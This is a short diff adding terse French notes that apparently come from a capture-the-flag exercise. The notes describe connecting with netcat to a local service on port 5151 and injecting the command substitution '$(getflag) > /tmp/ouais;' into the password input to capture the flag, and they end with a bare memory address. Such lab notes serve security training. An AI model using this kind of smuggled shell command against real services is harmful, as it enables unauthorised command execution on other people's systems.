@@ -1,0 +1,10 @@
+nc localhost 5151
+
+pour essayer de trouver le mdp
+sauf que on est est pas toctoc donc on reverse pas le hash
+par contre on glisse un petit "$(getflag) > /tmp/ouais;"
+histoire de choper le flag
+
+_____________
+
+*0x8048d7f
